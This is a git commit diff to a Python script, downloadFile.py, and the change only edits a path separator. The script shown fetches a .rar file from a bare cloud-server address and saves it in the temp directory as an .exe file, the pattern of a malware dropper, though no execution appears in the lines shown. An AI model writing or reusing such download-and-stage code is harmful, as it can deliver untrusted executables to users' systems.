49613ce58451bb01f62864c04cb085c4d0e137dd
islamTaha <tahai@codescalers.com>
2016-06-27 17:32:17 +0200

    edit path

--- source/downloadFile.py
+++ source/downloadFile.py
@@ -5,7 +5,7 @@ url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/101990.rar"
 response = requests.get(url, stream=True)
 
 tempDirectory = tempfile.gettempdir()
-newFile = tempDirectory + "\\outuput.exe"
+newFile = tempDirectory + "//outuput.exe"
 
 with open(newFile, "wb") as handle:
         handle.write(response.content)
